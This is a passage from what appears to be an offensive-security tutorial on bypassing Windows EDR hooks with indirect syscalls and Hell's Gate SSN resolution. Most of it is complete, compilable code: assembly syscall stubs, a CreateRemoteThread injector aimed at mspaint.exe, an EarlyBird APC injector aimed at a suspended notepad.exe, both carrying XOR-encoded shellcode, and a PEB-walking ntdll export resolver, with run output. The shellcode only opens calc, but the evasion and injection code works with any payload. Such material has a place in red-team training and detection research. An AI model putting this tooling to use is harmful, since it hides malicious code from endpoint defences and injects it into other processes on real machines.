        printf("[-] Failed to get ntdll handle\n");
        return 1;
    }

    ULONG_PTR pNtAlloc = (ULONG_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    if (!pNtAlloc) {
        printf("[-] Failed to resolve NtAllocateVirtualMemory\n");
        return 1;
    }

    // +0x12 = offset of syscall instruction in every Nt* stub on Win10/11 x64
    g_syscallAddr = pNtAlloc + 0x12;

    printf("[*] NtAllocateVirtualMemory  @ %p\n", (void*)pNtAlloc);
    printf("[*] syscall gadget (+0x12)   @ %p\n", (void*)g_syscallAddr);

    PVOID  buffer = NULL;
    SIZE_T size   = 0x1000;

    printf("[*] Calling SysNtAllocateVirtualMemory (indirect)...\n");

    NTSTATUS status = SysNtAllocateVirtualMemory(
        (HANDLE)-1,                     // current process pseudo-handle
        &buffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status == 0) {
        printf("[+] Allocated %zu bytes at %p\n", size, buffer);
    } else {
        printf("[-] Syscall failed: 0x%lX\n", status);
    }
    return 0;
}
```

```bash
PS C:\Users\At0m\Desktop> .\indirect_syscall.exe
[*] NtAllocateVirtualMemory  @ 00007ffb881ed300
[*] syscall gadget (+0x12)   @ 00007ffb881ed312
[*] Calling SysNtAllocateVirtualMemory (indirect)...
[+] Allocated 4096 bytes at 000001b730200000
```

This is the flow from user mode to kernel mode using Indirect Syscalls:

<svg width="100%" viewBox="0 0 680 580" role="img">
<title>Indirect syscall flow — user mode to kernel mode</title>
<desc>Shows malware using indirect syscalls to jump past EDR hooks into ntdll, transitioning to kernel mode via KiSystemCall64 and SSDT</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
</defs>

<!-- User mode container -->
<rect x="20" y="20" width="640" height="210" rx="10" fill="#1a1a1a" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="13" font-weight="600" fill="white" x="36" y="44">Windows user mode (Ring 3)</text>

<!-- Malware.exe box -->
<rect x="36" y="58" width="160" height="152" rx="6" fill="#2a1a1a" stroke="#7a2a2a" stroke-width="1"/>
<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="116" y="78" text-anchor="middle">Malware.exe</text>
<rect x="46" y="88" width="140" height="112" rx="4" fill="#6b1f1f" stroke="#9a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="10" fill="white" x="116" y="108" text-anchor="middle">mov r10, rcx</text>
<text font-family="monospace" font-size="10" fill="white" x="116" y="124" text-anchor="middle">mov eax, SSN</text>
<text font-family="monospace" font-size="10" fill="white" x="116" y="140" text-anchor="middle">jmp to syscall</text>
<text font-family="monospace" font-size="10" fill="white" x="116" y="156" text-anchor="middle">address in ntdll</text>
<text font-family="monospace" font-size="9" fill="#ffaaaa" x="116" y="176" text-anchor="middle">skips EDR hook</text>
<text font-family="monospace" font-size="9" fill="#ffaaaa" x="116" y="190" text-anchor="middle">at +0x00</text>

<!-- Windows API Kernel32 -->
<rect x="220" y="58" width="130" height="90" rx="6" fill="#222" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="11" fill="#aaa" x="285" y="82" text-anchor="middle">Windows API</text>
<text font-family="monospace" font-size="10" fill="#aaa" x="285" y="100" text-anchor="middle">CreateFileW()</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="#aaa" x="285" y="118" text-anchor="middle">Kernel32.dll</text>
<text font-family="monospace" font-size="9" fill="#666" x="285" y="138" text-anchor="middle">not called</text>

<!-- Windows API Kernelbase -->
<rect x="370" y="58" width="130" height="90" rx="6" fill="#222" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="11" fill="#aaa" x="435" y="82" text-anchor="middle">Windows API</text>
<text font-family="monospace" font-size="10" fill="#aaa" x="435" y="100" text-anchor="middle">CreateFileW()</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="#aaa" x="435" y="118" text-anchor="middle">Kernelbase.dll</text>
<text font-family="monospace" font-size="9" fill="#666" x="435" y="138" text-anchor="middle">not called</text>

<!-- Native API ntdll -->
<rect x="520" y="58" width="124" height="90" rx="6" fill="#222" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="11" fill="white" x="582" y="80" text-anchor="middle">Native API</text>
<text font-family="monospace" font-size="10" fill="white" x="582" y="97" text-anchor="middle">NtCreateFile()</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="582" y="114" text-anchor="middle">Ntdll.dll</text>

<!-- syscall return box inside ntdll -->
<rect x="530" y="158" width="104" height="56" rx="4" fill="#6b1f1f" stroke="#9a2a2a" stroke-width="0.5"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="582" y="180" text-anchor="middle">syscall</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="582" y="198" text-anchor="middle">return</text>

<!-- arrow: malware jmp to ntdll syscall -->
<path d="M116 210 L116 232 L582 232 L582 214" fill="none" stroke="#cc4444" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- arrow: ntdll to kernelbase (dimmed, normal path) -->
<line x1="500" y1="100" x2="502" y2="100" stroke="#444" stroke-width="1" marker-end="url(#arrow)"/>
<line x1="435" y1="100" x2="518" y2="100" stroke="#444" stroke-width="1" stroke-dasharray="3 2" marker-end="url(#arrow)"/>
<line x1="285" y1="100" x2="368" y2="100" stroke="#444" stroke-width="1" stroke-dasharray="3 2" marker-end="url(#arrow)"/>

<!-- kernel mode container -->
<rect x="20" y="260" width="640" height="300" rx="10" fill="#111" stroke="#444" stroke-width="1"/>
<text font-family="monospace" font-size="13" font-weight="600" fill="white" x="36" y="284">Windows kernel mode (Ring 0)</text>

<!-- KiSystemCall64 -->
<rect x="480" y="298" width="160" height="56" rx="6" fill="#1a2a1a" stroke="#2a6a2a" stroke-width="1"/>
<text font-family="monospace" font-size="10" fill="#aaa" x="560" y="318" text-anchor="middle">Execute</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="560" y="338" text-anchor="middle">KiSystemCall64</text>

<!-- SSDT -->
<rect x="360" y="390" width="280" height="80" rx="6" fill="#1a2a1a" stroke="#2a6a2a" stroke-width="1"/>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="500" y="415" text-anchor="middle">System Service Descriptor Table</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="500" y="432" text-anchor="middle">(SSDT)</text>
<text font-family="monospace" font-size="9" fill="#aaa" x="500" y="452" text-anchor="middle">looks up SSN → finds NtCreateFile kernel addr</text>

<!-- NtCreateFile kernel -->
<rect x="60" y="390" width="200" height="80" rx="6" fill="#1a2a1a" stroke="#2a6a2a" stroke-width="1"/>
<text font-family="monospace" font-size="10" fill="#aaa" x="160" y="418" text-anchor="middle">Execute</text>
<text font-family="monospace" font-size="11" fill="white" x="160" y="436" text-anchor="middle">NtCreateFile()</text>
<text font-family="monospace" font-size="11" font-weight="600" fill="white" x="160" y="454" text-anchor="middle">Function Code</text>

<!-- arrow: syscall drops to KiSystemCall64 -->
<line x1="582" y1="214" x2="582" y2="260" stroke="#cc4444" stroke-width="1.5" stroke-dasharray="4 2"/>
<line x1="582" y1="260" x2="582" y2="296" stroke="#cc4444" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- arrow: KiSystemCall64 to SSDT -->
<line x1="560" y1="354" x2="560" y2="388" stroke="#4a9a4a" stroke-width="1.5" marker-end="url(#arrow)"/>

<!-- arrow: SSDT to NtCreateFile -->
<line x1="358" y1="430" x2="262" y2="430" stroke="#4a9a4a" stroke-width="1.5" marker-end="url(#arrow)"/>

</svg>
`syscalls.S`:

```c
.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

/* runtime-resolved syscall gadget addresses (C populates before first call) */
.data
.global g_NtAllocAddr
.global g_NtWriteAddr
.global g_NtProtectAddr
.global g_NtQueueApcAddr
.global g_NtResumeAddr

g_NtAllocAddr:    .quad 0
g_NtWriteAddr:    .quad 0
g_NtProtectAddr:  .quad 0
g_NtQueueApcAddr: .quad 0
g_NtResumeAddr:   .quad 0

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x18
    jmp     qword ptr [rip + g_NtAllocAddr]

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x3A
    jmp     qword ptr [rip + g_NtWriteAddr]

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x50
    jmp     qword ptr [rip + g_NtProtectAddr]

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, 0x45
    jmp     qword ptr [rip + g_NtQueueApcAddr]

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, 0x52
    jmp     qword ptr [rip + g_NtResumeAddr]
```

`CreateRemoteThread.c`:

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

/* syscall gadget addresses — populated by resolve_syscalls() before any call */
extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

/*
 * calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
 * XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
 */
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

/*
 * Resolve the syscall gadget (0F 05) for each Nt* function.
 * +0x12 is the fixed offset of the syscall instruction in every stub on
 * Win10/11 x64: 3 (mov r10,rcx) + 5 (mov eax,N) + 8 (test/jne) + 2 (syscall) = 18 = 0x12
 * The hook, if present, lives at +0x00 and is only 5 bytes +0x12 is untouched.
 */
static void resolve_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    g_NtAllocAddr   = (ULONG_PTR)GetProcAddress(ntdll, "NtAllocateVirtualMemory")  + 0x12;
    g_NtWriteAddr   = (ULONG_PTR)GetProcAddress(ntdll, "NtWriteVirtualMemory")     + 0x12;
    g_NtProtectAddr = (ULONG_PTR)GetProcAddress(ntdll, "NtProtectVirtualMemory")   + 0x12;

    printf("[*] syscall gadgets resolved:\n");
    printf("    NtAllocateVirtualMemory  +0x12 -> %p\n", (void*)g_NtAllocAddr);
    printf("    NtWriteVirtualMemory     +0x12 -> %p\n", (void*)g_NtWriteAddr);
    printf("    NtProtectVirtualMemory   +0x12 -> %p\n", (void*)g_NtProtectAddr);
}

static DWORD pid_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    resolve_syscalls();

    DWORD pid = pid_by_name("mspaint.exe");
    if (!pid) { printf("[-] mspaint.exe not found\n"); return 1; }
    printf("[*] Target PID: %lu\n", pid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        hProc, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Remote buffer: %p (%zu bytes)\n", buf, size);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(hProc, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG old_protect = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(hProc, &buf, &protect_size, PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); return 1; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_protect);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }
    printf("[+] Thread: %p\n", hThread);

    WaitForSingleObject(hThread, 4000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

`EarlyBird.c`:

```c
#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

/* syscall gadget addresses — populated by resolve_syscalls() before any call */
extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;
extern ULONG_PTR g_NtQueueApcAddr;
extern ULONG_PTR g_NtResumeAddr;

extern NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS SysNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

extern NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID  ApcRoutine,
    PVOID  ApcArgument1,
    PVOID  ApcArgument2,
    PVOID  ApcArgument3
);

extern NTSTATUS SysNtResumeThread(
    HANDLE  ThreadHandle,
    PULONG  PreviousSuspendCount
);

/*
 * calc.exe shellcode (windows/x64/exec CMD=calc.exe, 276 bytes)
 * XOR-encoded with key {0xDE, 0xAD, 0xBE, 0xEF}
 */
static unsigned char sc_enc[] = {
    0x22,0xe5,0x3d,0x0b,0x2e,0x45,0x7e,0xef,0xde,0xad,0xff,0xbe,0x9f,0xfd,
    0xec,0xbe,0x88,0xe5,0x8f,0x3d,0xbb,0xe5,0x35,0xbd,0xbe,0xe5,0x35,0xbd,
    0xc6,0xe5,0x35,0xbd,0xfe,0xe5,0x35,0x9d,0x8e,0xe5,0xb1,0x58,0x94,0xe7,
    0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0x91,0xdf,0x93,0xdc,0x81,0x9e,0xae,
    0x1f,0x64,0xb3,0xae,0xdf,0x6c,0x5c,0x02,0x8c,0xec,0xef,0xa7,0x55,0xff,
    0x9e,0x64,0x9c,0x91,0xf6,0xee,0x0e,0x26,0x3e,0x67,0xde,0xad,0xbe,0xa7,
    0x5b,0x6d,0xca,0x88,0x96,0xac,0x6e,0xbf,0x55,0xe5,0xa6,0xab,0x55,0xed,
    0x9e,0xa6,0xdf,0x7d,0x5d,0xb9,0x96,0x52,0x77,0xae,0x55,0x99,0x36,0xa7,
    0xdf,0x7b,0xf3,0xde,0x17,0xe5,0x8f,0x2f,0x72,0xec,0x7f,0x26,0xd3,0xec,
    0xbf,0x2e,0xe6,0x4d,0xcb,0x1e,0x92,0xae,0xf2,0xcb,0xd6,0xe8,0x87,0x3e,
    0xab,0x75,0xe6,0xab,0x55,0xed,0x9a,0xa6,0xdf,0x7d,0xd8,0xae,0x55,0xa1,
    0xf6,0xab,0x55,0xed,0xa2,0xa6,0xdf,0x7d,0xff,0x64,0xda,0x25,0xf6,0xee,
    0x0e,0xec,0xe6,0xae,0x86,0xf3,0xe7,0xb5,0x9f,0xf5,0xff,0xb6,0x9f,0xf7,
    0xf6,0x6c,0x32,0x8d,0xff,0xbd,0x21,0x4d,0xe6,0xae,0x87,0xf7,0xf6,0x64,
    0xcc,0x44,0xe9,0x10,0x21,0x52,0xe3,0xa7,0x64,0xac,0xbe,0xef,0xde,0xad,
    0xbe,0xef,0xde,0xe5,0x33,0x62,0xdf,0xac,0xbe,0xef,0x9f,0x17,0x8f,0x64,
    0xb1,0x2a,0x41,0x3a,0x65,0x5d,0x0b,0x4d,0x88,0xec,0x04,0x49,0x4b,0x10,
    0x23,0x10,0x0b,0xe5,0x3d,0x2b,0xf6,0x91,0xb8,0x93,0xd4,0x2d,0x45,0x0f,
    0xab,0xa8,0x05,0xa8,0xcd,0xdf,0xd1,0x85,0xde,0xf4,0xff,0x66,0x04,0x52,
    0x6b,0x8c,0xbf,0xc1,0xdd,0xc1,0xbb,0xd5,0xdb,0xef,
};

static const unsigned char xor_key[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void xor_decode(unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= xor_key[i % sizeof(xor_key)];
}

/*
 * Resolve the syscall gadget (0F 05) for each Nt* function.
 * +0x12 is the fixed offset of the syscall instruction in every stub on
 * Win10/11 x64: 3 (mov r10,rcx) + 5 (mov eax,N) + 8 (test/jne) + 2 (syscall) = 18 = 0x12
 * The hook, if present, lives at +0x00 and is only 5 bytes +0x12 is untouched.
 */
static void resolve_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    g_NtAllocAddr    = (ULONG_PTR)GetProcAddress(ntdll, "NtAllocateVirtualMemory") + 0x12;
    g_NtWriteAddr    = (ULONG_PTR)GetProcAddress(ntdll, "NtWriteVirtualMemory")    + 0x12;
    g_NtProtectAddr  = (ULONG_PTR)GetProcAddress(ntdll, "NtProtectVirtualMemory")  + 0x12;
    g_NtQueueApcAddr = (ULONG_PTR)GetProcAddress(ntdll, "NtQueueApcThread")        + 0x12;
    g_NtResumeAddr   = (ULONG_PTR)GetProcAddress(ntdll, "NtResumeThread")          + 0x12;

    printf("[*] syscall gadgets resolved:\n");
    printf("    NtAllocateVirtualMemory  +0x12 -> %p\n", (void*)g_NtAllocAddr);
    printf("    NtWriteVirtualMemory     +0x12 -> %p\n", (void*)g_NtWriteAddr);
    printf("    NtProtectVirtualMemory   +0x12 -> %p\n", (void*)g_NtProtectAddr);
    printf("    NtQueueApcThread         +0x12 -> %p\n", (void*)g_NtQueueApcAddr);
    printf("    NtResumeThread           +0x12 -> %p\n", (void*)g_NtResumeAddr);
}

int main(void) {
    resolve_syscalls();

    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] PID %lu TID %lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    unsigned char *decoded = (unsigned char *)malloc(sizeof(sc_enc));
    memcpy(decoded, sc_enc, sizeof(sc_enc));
    xor_decode(decoded, sizeof(sc_enc));

    PVOID  buf  = NULL;
    SIZE_T size = sizeof(sc_enc);

    NTSTATUS st = SysNtAllocateVirtualMemory(
        pi.hProcess, &buf, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) { printf("[-] NtAllocateVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Remote buffer: %p\n", buf);

    SIZE_T written = 0;
    st = SysNtWriteVirtualMemory(pi.hProcess, buf, decoded, sizeof(sc_enc), &written);
    free(decoded);
    if (!NT_SUCCESS(st)) { printf("[-] NtWriteVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Wrote %zu bytes\n", written);

    ULONG old_protect = 0;
    SIZE_T protect_size = sizeof(sc_enc);
    st = SysNtProtectVirtualMemory(pi.hProcess, &buf, &protect_size, PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(st)) { printf("[-] NtProtectVirtualMemory: 0x%lX\n", st); goto fail; }
    printf("[+] Protection: RW -> RX (was 0x%lX)\n", old_protect);

    /*
     * Queue APC to the suspended main thread.
     * When resumed the thread enters an alertable wait before the entry point,
     * so the APC fires first, shellcode runs before any process code.
     */
    st = SysNtQueueApcThread(pi.hThread, buf, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) { printf("[-] NtQueueApcThread: 0x%lX\n", st); goto fail; }
    printf("[+] APC queued at %p\n", buf);

    ULONG prev = 0;
    st = SysNtResumeThread(pi.hThread, &prev);
    if (!NT_SUCCESS(st)) { printf("[-] NtResumeThread: 0x%lX\n", st); goto fail; }
    printf("[+] Resumed (prev suspend count: %lu)\n", prev);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

fail:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
```
# Dynamic SSN Resolution

In Direct and Indirect syscalls we have managed to solve the issue to call the syscall instruction but the main problem is still that we are using hardcoded numbers like `0x18` to call SSN. This hex number uses System Service Descriptor Table (SSDT) to look up the right function in kernel. The problem is that `0x18` is not guaranteed. Microsoft does not publish SSNs, does not document them, and does not promise they stay the same between Windows versions. They are an internal kernel implementation detail that changes freely. We will resolve SSNs dynamically at runtime by reading them directly out of ntdll, no hardcoding, no lookup tables, works on every Windows version automatically. We will also handle the case where ntdll is hooked and the SSN is no longer readable at the expected location. 
## Hell's Gate

The SSN lives inside the ntdll stub at `+0x04`. Hell's Gate is just reading it from there at runtime instead of hardcoding it. That's the entire idea. Every `Nt*` stub in ntdll looks like this on clean unhooked Windows:

```
+0x00  4C 8B D1           mov  r10, rcx
+0x03  B8 18 00 00 00     mov  eax, 0x18    ; B8 is the opcode, 18 is the SSN
+0x08  F6 04 25 ...       test byte ptr
+0x10  75 03              jne
+0x12  0F 05              syscall
+0x14  C3                 ret
```

The `B8` at `+0x03` is the opcode for `mov eax, imm32`. The four bytes that follow it (`+0x04` through `+0x07`) are the SSN as a little-endian 32-bit integer. For `NtAllocateVirtualMemory` on Windows 10 1903 that's `18 00 00 00` = `0x00000018` = `24` decimal. The approach is:

- Find ntdll's base address
- Walk its Export Address Table to find the target function
- Check that `+0x03` contains `B8`, stub is clean and unhooked
- Read the 4 bytes at `+0x04` that's the SSN

```c
// Build:
//   x86_64-w64-mingw32-gcc hells_gate_test.c -o hells_gate_test.exe

#include <windows.h>
#include <stdio.h>

#define SSN_NOT_FOUND 0xFFFFFFFF

// Walk PEB->Ldr->InMemoryOrderModuleList to get ntdll base without any API call.
// ntdll is always the second entry in the list (exe is first).
static PVOID get_ntdll_base(void) {
    ULONG_PTR peb, ldr, flink;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    ldr   = *(ULONG_PTR*)(peb  + 0x18);  // PEB->Ldr
    flink = *(ULONG_PTR*)(ldr  + 0x20);  // Ldr->InMemoryOrderModuleList.Flink (exe)
    flink = *(ULONG_PTR*)(flink);         // exe->Flink -> ntdll InMemoryOrderLinks
    return (PVOID)*(ULONG_PTR*)(flink + 0x20); // +0x20 from InMemoryOrderLinks = DllBase
}

// Walk a module's Export Address Table to find a function by name.
static PVOID get_func_addr(PVOID base, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)base + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (ULONG_PTR)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD names = (PDWORD)((ULONG_PTR)base + exp->AddressOfNames);
    PWORD  ords  = (PWORD) ((ULONG_PTR)base + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((ULONG_PTR)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *n = (char *)((ULONG_PTR)base + names[i]);
        if (strcmp(n, name) == 0)
            return (PVOID)((ULONG_PTR)base + funcs[ords[i]]);
    }
    return NULL;
}

// Read SSN from an unhooked ntdll stub.
// Clean stub layout:
//   +0x00  4C 8B D1        mov r10, rcx
//   +0x03  B8 XX XX XX XX  mov eax, <SSN>
// If hooked, +0x00 is E9 (jmp) and we return SSN_NOT_FOUND.
static DWORD get_ssn(PVOID func) {
    ULONG_PTR p = (ULONG_PTR)func;
    if (*(BYTE*)(p+0) == 0x4C &&
        *(BYTE*)(p+1) == 0x8B &&
        *(BYTE*)(p+2) == 0xD1 &&
        *(BYTE*)(p+3) == 0xB8)
        return *(DWORD*)(p + 0x04);
    return SSN_NOT_FOUND;
}

int main(void) {
    PVOID ntdll = get_ntdll_base();
    printf("[+] ntdll base: %p\n\n", ntdll);

    const char *targets[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtResumeThread",
    };

    for (int i = 0; i < 5; i++) {
        PVOID func = get_func_addr(ntdll, targets[i]);
        if (!func) {
            printf("[-] %-32s not found\n", targets[i]);
            continue;
        }

        DWORD ssn = get_ssn(func);
        if (ssn == SSN_NOT_FOUND)
            printf("[-] %-32s @ %p  HOOKED\n", targets[i], func);
        else
            printf("[+] %-32s @ %p  SSN = 0x%02X (%u)\n", targets[i], func, ssn, ssn);
    }

    return 0;
}
```

```powershell
PS C:\Users\At0m\Desktop> .\hells_gate_test.exe
[+] ntdll base: 00007ffb88150000

[+] NtAllocateVirtualMemory          @ 00007ffb881ed300  SSN = 0x18 (24)
[+] NtWriteVirtualMemory             @ 00007ffb881ed740  SSN = 0x3A (58)
[+] NtProtectVirtualMemory           @ 00007ffb881eda00  SSN = 0x50 (80)
